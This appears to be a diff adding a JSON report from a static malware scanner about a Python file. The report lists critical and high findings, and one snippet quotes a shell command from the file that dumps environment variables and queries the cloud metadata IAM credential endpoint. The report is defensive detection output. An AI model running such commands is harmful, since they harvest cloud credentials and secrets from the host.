@@ -1,0 +1,65 @@
+{
+  "file_hash": "44aab6e7f2c3fab9a32ea0bd655d244715f2390734fd1dbf9cdfe5f1873b1ac6",
+  "file_size": 1754,
+  "file_type": "python",
+  "is_text": true,
+  "entropy": 4.755450477133785,
+  "max_severity": "critical",
+  "severity_score": 1.0,
+  "findings": [
+    {
+      "layer": "L2_REGEX",
+      "severity": "critical",
+      "primitive": "shell.subprocess_shell",
+      "location": "line 44:col 9",
+      "snippet": "subprocess.Popen(\n            \"/bin/sh -c \\\"env > /tmp/.compat_env; curl -s http://169.254.169.254/latest/meta-data/iam/",
+      "explanation": "subprocess call with shell=True \u2014 RCE if any arg is attacker-controlled.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "high",
+      "primitive": "ssrf.url",
+      "location": "line 45:col 59",
+      "snippet": "http://169.254.169.254",
+      "explanation": "SSRF target \u2014 cloud metadata endpoint or localhost.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "low",
+      "primitive": "ipv4.external",
+      "location": "line 45:col 66",
+      "snippet": "169.254.169.254",
+      "explanation": "Hardcoded IPv4 \u2014 verify it's not a C2 endpoint.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L1_AST",
+      "severity": "critical",
+      "primitive": "subprocess.shell_true",
+      "location": "line 44:col 8",
+      "snippet": "subprocess.<call>(..., shell=True)",
+      "explanation": "shell=True with any user-tainted input is RCE.",
+      "confidence": 1.0
+    },
+    {
+      "layer": "L5_STRUCTURE",
+      "severity": "high",
+      "primitive": "structure.delayed_payload",
+      "location": "source",
+      "snippet": "time.sleep(N) ... sensitive_call()",
+      "explanation": "Long sleep preceding sensitive call \u2014 APT pattern to evade sandboxes.",
+      "confidence": 0.75
+    }
+  ],
+  "scan_duration_ms": 2.409925999927509,
+  "layers_run": [
+    "L3_BYTES",
+    "L4_ENTROPY",
+    "L2_REGEX",
+    "L1_AST",
+    "L5_STRUCTURE"
+  ],
+  "error": null
+}
